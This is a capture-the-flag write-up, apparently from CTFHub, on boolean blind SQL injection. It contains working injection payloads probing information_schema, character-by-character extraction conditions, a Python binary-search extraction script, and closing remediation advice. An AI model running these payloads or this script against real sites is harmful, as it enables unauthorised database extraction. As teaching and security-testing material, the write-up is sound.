CTFHub - Web - SQL注入 - 布尔盲注

# CTFHub # Web # SQL注入 # 布尔盲注 # 二分法

一、题目信息

  • 题目名称：布尔盲注
  • 题目方向：Web - SQL注入
  • 题目环境：动态分配的 HTTP 服务地址
  • 题目目标：根据页面返回的成功或失败状态构造布尔条件，逐字符提取 flag。

二、判断注入类型

页面提供 id 查询参数，并直接回显服务端执行的 SQL 语句。提交 id=1 时显示：

select * from news where id=1
query_success

参数没有单引号包裹，属于整数型注入点。继续提交真、假两个条件：

id=1 and 1=1
select * from news where id=1 and 1=1
query_success

id=1 and 1=2
select * from news where id=1 and 1=2
query_error

页面虽然不直接返回查询结果，但会根据 SQL 条件是否成立返回 query_success 或 query_error，因此可以把返回状态当作布尔判断条件。

三、确认数据库结构

先验证当前数据库名称。以下条件返回 query_success，说明数据库名为 sqli：

id=1 and database()='sqli'

通过 information_schema.tables 判断名为 flag 的表是否存在：

id=1 and (select count(*)
from information_schema.tables
where table_schema=database()
and table_name='flag')>0

继续判断 flag 表中是否存在同名字段：

id=1 and (select count(*)
from information_schema.columns
where table_schema=database()
and table_name='flag'
and column_name='flag')>0

两次查询均返回 query_success，目标数据位于 sqli.flag.flag。

四、确定 Flag 长度

使用 length() 获取目标字段值长度：

id=1 and length((select flag from flag limit 0,1))=32

条件成立，因此 flag 共 32 个字符。未知长度时也可以通过 length(...) > n 逐步二分或倍增确定。

五、逐字符构造布尔条件

使用 substring() 截取指定位置的字符，再通过 ascii() 转为 ASCII 码进行判断。下面条件用于验证第 1 个字符的 ASCII 码是否为 99，即字符 c：

id=1 and ascii(substring((select flag from flag limit 0,1),1,1))=99

进一步使用大于等于条件进行二分查找：

id=1 and (ascii(substring((select flag from flag limit 0,1),1,1))>=99)

ASCII 可视字符通常位于 32 至 126 之间。每次测试区间中点，根据 query_success 或 query_error 收缩范围，最多 7 次请求即可确定一个字符。

六、自动化提取脚本

使用 Python 将布尔判断封装为 oracle()，再对长度和每个字符执行二分查找：

import requests

URL = "http://target/"
EXPR = "(select flag from flag limit 0,1)"
session = requests.Session()

def oracle(condition):
    payload = f"1 and ({condition})"
    response = session.get(URL, params={"id": payload}, timeout=10)
    return "query_success" in response.text

def get_length():
    low, high = 1, 128
    while low < high:
        mid = (low + high) // 2
        if oracle(f"length({EXPR})>={mid}"):
            low = mid + 1
        else:
            high = mid
    return low - 1

def get_char(pos):
    low, high = 1, 128
    while low < high:
        mid = (low + high) // 2
        condition = f"ascii(substring({EXPR},{pos},1))>={mid}"
        if oracle(condition):
            low = mid + 1
        else:
            high = mid
    return chr(low - 1)

length = get_length()
flag = "".join(get_char(pos) for pos in range(1, length + 1))
print(flag)

七、最终 Flag

八、修复建议

  • 使用预处理语句和参数绑定，禁止将用户输入直接拼接进 SQL 语句。
  • 对 id 等参数执行严格的数据类型校验，只允许合法的整数输入。
  • 统一真假条件下的页面响应，避免业务状态成为可区分的布尔侧信道。
  • 数据库账号遵循最小权限原则，限制对 information_schema 和业务表的访问能力。

九、解题总结

布尔盲注不会在页面中直接回显查询结果，而是通过响应差异泄露一个比特的信息。本题将 query_success 与 query_error 作为真假分支，配合 length()、substring() 和 ascii() 逐字符提取 flag；使用二分法后，每个字符最多只需 7 次请求。实际开发中应使用参数化查询，并避免在响应中暴露可被利用的条件差异。
